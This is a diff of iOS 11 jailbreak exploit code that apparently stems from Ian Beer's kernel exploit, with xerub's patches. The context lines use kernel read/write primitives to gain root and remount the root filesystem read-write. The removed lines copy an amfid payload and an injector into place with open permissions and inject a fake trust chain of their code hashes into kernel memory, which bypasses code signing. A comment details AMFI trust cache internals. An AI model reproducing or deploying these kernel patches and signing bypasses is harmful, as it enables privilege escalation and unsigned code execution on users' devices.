@@ -6,7 +6,7 @@
 //  Copyright © 2017 Ian Beer. All rights reserved.
 //
 
-#include "./fun.h"
+#include "fun.h"
 
 unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
 unsigned offsetof_task = 0x18;                // proc_t::task
@@ -255,20 +255,11 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 	
 	// setuid(0) + test
 	{
-		
 		printf("[fun] our uid was %d\n", getuid());
 		
 		setuid(0);
 		
 		printf("[fun] our uid is %d\n", getuid());
-		
-		FILE *f = fopen("/var/mobile/.root_fun", "w");
-		if (f == 0) {
-			printf("[fun] failed to write test file. something didn't work\n");
-		} else {
-			printf("[fun] wrote test file: %p\n", f);
-		}
-		fclose(f);
 	}
 	
 	// Remount / as rw - patch by xerub
@@ -287,111 +278,8 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		
 		v_mount = kread64(rootfs_vnode + off);
 		kwrite32(v_mount + 0x71, v_flag);
-		
-		int fd = open("/.bit_of_fun", O_RDONLY);
-		if (fd == -1) {
-			fd = creat("/.bit_of_fun", 0644);
-		} else {
-			printf("[fun] file already exists!\n");
-		}
-		close(fd);
-		
-		printf("[fun] Did we mount / as read+write? %s\n", file_exist("/.bit_of_fun") ? "yes" : "no");
 	}
 	
-	// Prepare our binaries
-	{
-		if (!file_exist("/fun_bins")) {
-			mkdir("/fun_bins", 777);
-		}
-		
-		/* uncomment if you need to replace the binaries */
-		unlink("/fun_bins/inject_amfid");
-		unlink("/fun_bins/amfid_payload.dylib");
-//		unlink("/fun_bins/test.dylib");
-		
-		if (!file_exist("/fun_bins/inject_amfid")) {
-			cp(resourceInBundle("inject_amfid"), "/fun_bins/inject_amfid");
-			chmod("/fun_bins/inject_amfid", 777);
-		}
-		if (!file_exist("/fun_bins/amfid_payload.dylib")) {
-			cp(resourceInBundle("amfid_payload.dylib"), "/fun_bins/amfid_payload.dylib");
-			chmod("/fun_bins/amfid_payload.dylib", 777);
-		}
-		if (!file_exist("/fun_bins/test.dylib")) {
-			cp(resourceInBundle("test.dylib"), "/fun_bins/test.dylib");
-			chmod("/fun_bins/test.dylib", 777);
-		}
-		
-		printf("[fun] copied the required binaries into the right places\n");
-	}
-	
-	// trust cache injection
-	{
-		/*
-		 Note this patch still came from @xerub's KPPless branch, but detailed below is kind of my adventures which I rediscovered most of what he did
-		 
-		 So, as said on twitter by @Morpheus______, iOS 11 now uses SHA256 for code signatures, rather than SHA1 like before.
-		 What confuses me though is that I believe the overall CDHash is SHA1, but each subhash is SHA256. In AMFI.kext, the memcmp
-		 used to check between the current hash and the hashes in the cache seem to be this CDHash. So the question is do I really need
-		 to get every hash, or just the main CDHash and insert that one into the trust chain?
-		 
-		 If we look at the trust chain code checker (0xFFFFFFF00637B3E8 6+ 11.1.2), it is pretty basic. The trust chain is in the format of
-		 the following (struct from xerub, but I've checked with AMFI that it is the case):
-		 
-		 struct trust_mem {
-		 uint64_t next; 				// +0x00 - the next struct trust_mem
-		 unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
-		 unsigned int count;			// +0x18 - Number of hashes there are
-		 unsigned char hashes[];		// +0x1C - The hashes
-		 }
-		 
-		 The trust chain checker does the following:
-		 - Find the first struct that has a count > 0
-		 - Loop through all the hashes in the struct, comparing with the current hash
-		 - Keeps going through each chain, then when next is 0, it finishes
-		 
-		 UPDATE: a) was using an old version of JTool. Now I realised the CDHash is SHA256
-		 b) For launchd (whose hash resides in the AMFI cache), the first byte is used as an index sort of thing, and the next *19* bytes are used for the check
-		 This probably means that only the first 20 bytes of the CDHash are used in the trust cache check
-		 
-		 So our execution method is as follows:
-		 - Calculate the CD Hashes for the target resources that we want to play around with
-		 - Create a custom trust chain struct, and insert it into the existing trust chain - only storing the first 20 bytes of each hash
-		 - ??? PROFIT
-		 */
-		
-		uint64_t tc = find_trustcache();
-		printf("[fun] trust cache at: %016llx\n", kread64(tc));
-		
-		typedef char hash_t[20];
-		
-		struct trust_chain {
-			uint64_t next; 				// +0x00 - the next struct trust_mem
-			unsigned char uuid[16];		// +0x08 - The uuid of the trust_mem (it doesn't seem important or checked apart from when importing a new trust chain)
-			unsigned int count;			// +0x18 - Number of hashes there are
-			hash_t hash[10];		// +0x1C - The hashes
-		};
-		
-		struct trust_chain fake_chain;
-		
-		fake_chain.next = kread64(tc);
-		*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
-		*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
-		fake_chain.count = 2;
-		
-		uint8_t *hash = get_sha256(get_code_directory("/fun_bins/inject_amfid"));
-		uint8_t *hash2 = get_sha256(get_code_directory("/fun_bins/amfid_payload.dylib"));
-		
-		memmove(fake_chain.hash[0], hash, 20);
-		memmove(fake_chain.hash[1], hash2, 20);
-		
-		uint64_t kernel_trust = kalloc(sizeof(fake_chain));
-		kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
-		kwrite64(tc, kernel_trust);
-		
-		printf("[fun] Wrote the signatures into the trust cache!\n");
-	}
 	
 //	printf("[fun] currently cs_debug is at %d\n", rk32(0xFFFFFFF0076220EC+slide));
 //	wk32(0xFFFFFFF0076220EC+slide, 100);
@@ -536,11 +424,9 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 			proc = kread64(proc);
 		}
 	}
-
+    
 	waitpid(pd, NULL, 0);
-	
-	
-	
+
 	
 	// Cleanup
 	
